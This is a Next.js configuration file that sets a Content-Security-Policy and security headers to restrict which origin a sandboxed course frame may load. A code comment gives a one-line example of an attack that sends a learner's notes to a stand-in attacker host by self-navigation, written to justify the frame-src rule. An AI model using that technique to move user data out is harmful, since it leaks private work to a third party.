import type { NextConfig } from "next";

/**
 * Where course content is served from. Read at build time, like every other
 * NEXT_PUBLIC_ value, so the policy an image ships with matches the origin it was
 * built for.
 */
const COURSES_ORIGIN =
  process.env.NEXT_PUBLIC_COURSES_ORIGIN ?? "http://127.0.0.1:3101";

/**
 * The shell's Content-Security-Policy.
 *
 * `frame-src` is the reason this exists. A course runs in a sandboxed frame on
 * another origin, and it can navigate *itself* — `location.href = 'https://evil/?d='
 * + theLearnersNotes` is a network request carrying their work out. Nothing the
 * courses origin sends can stop that: connect-src governs fetch, form-action governs
 * form submission, and there is no directive for where a document may navigate itself
 * — navigate-to was specified and dropped. The only policy that applies is the
 * embedding document's frame-src, because the embedder decides what its frames may
 * load. That is here, and it was missing.
 *
 * Deliberately narrow. There is no `default-src`, and no `script-src` or `style-src`:
 * Next serves inline scripts for hydration and inline styles, so a policy covering
 * them needs per-request nonces, which needs a proxy and is a larger piece of work.
 * Everything below is either absent-today behaviour or a directive that cannot affect
 * a page that already works, so this is strictly additive hardening rather than a
 * complete policy. A full script-src is worth doing before a public deploy.
 *
 * Verified by e2e/security.spec.ts: the course frame still loads from the courses
 * origin, and cannot navigate itself anywhere else.
 */
const CSP = [
  // The whole point: a course frame may only ever be the courses origin.
  `frame-src 'self' ${COURSES_ORIGIN}`,
  // Bud is not embeddable. Nothing frames it, and nothing should.
  `frame-ancestors 'none'`,
  `base-uri 'self'`,
  // Forms post through fetch, so nothing legitimate navigates on submit.
  `form-action 'self'`,
  `object-src 'none'`,
].join("; ");

const nextConfig: NextConfig = {
  // Pin the workspace root. Without this, Turbopack walks up and finds a stray
  // package-lock.json in the home directory and infers the wrong root.
  turbopack: { root: __dirname },

  // Tech-Information.md §10 rule 8: both apps ship as containers, even while the
  // web app could run on Vercel. Keeps the exit door open.
  output: "standalone",

  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          { key: "Content-Security-Policy", value: CSP },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        ],
      },
    ];
  },
};

export default nextConfig;
